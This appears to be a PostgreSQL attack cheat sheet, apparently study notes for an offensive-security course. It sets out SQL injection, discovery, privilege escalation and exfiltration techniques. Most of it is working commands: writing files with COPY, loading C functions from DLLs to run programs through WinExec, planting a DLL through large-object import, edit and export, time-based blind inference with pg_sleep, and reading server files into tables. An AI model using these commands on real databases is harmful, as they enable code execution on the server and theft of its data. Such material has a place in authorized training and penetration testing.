## FYI

Delimit strings using `$$`, e.g. `select $$hello world$$`.

```pgsql
create temp table mytable (content text);
drop table mytable;
```

## Injection


## Discovery

`\dt` describe tables
`\df` describe functions
`\d pg_largeobject` describe table schema

```pgsql
select current_setting('is_superuser');
```

## Escalation

### File System Access
Write to the file system

```pqsql
copy (select $$awae$$) to $$C:\Users\Public\offsec.txt$$;
```

### User Defined Functions

Create compiled postgres extension .dll files with user defined functions (UDF).  You will need the C code for the reverse shell and compile it with magic PGSQL headers.

```
create or replace function system(cstring) returns int as 'C:\Windows\System32\kernel.dll','WinExec' language c strict;
```
```
create or replace function test(text, integer) returns void as $$C:\awae.dll$$,$$awae$$ language c strict;

select test($$calc.exe$$, 3);

drop function test(text, integer);
```

### Large Objects

If you have DBA privileges, you can also import large objects into the `PG_LARGEOBJECT` table, with a random or given large object ID stored in the `loid` column.  Note that:
* The objects are stored in 2KB chunks as indicated by the `pageno` column.
* The `lo_import` and `lo_export` functions also update a bunch of other metadata.  Therefore updating the `pg_largeobject` table directly is not recommended.

```pgsql
select lo_import($$C:\awae.dll$$);
select lo_import($$C:\awae.dll$$, 1337);
```
```pqsql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
```pqsql
update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
```
```pgsql
select lo_export(1337, $$C:\awae.dll$$);
```
```pgsql
\lo_list
\lo_unlink 1337
select lo_unlink(1337);
```





## Exfiltration

Time-based inference

```pgsql
select case when (select current_setting('is_superuser'))=$$on$$ then pg_sleep(5) end;
```

Read data from the file system into a table

```pgsql
copy mytable from $$C:\Users\Public\offsec.txt$$;
```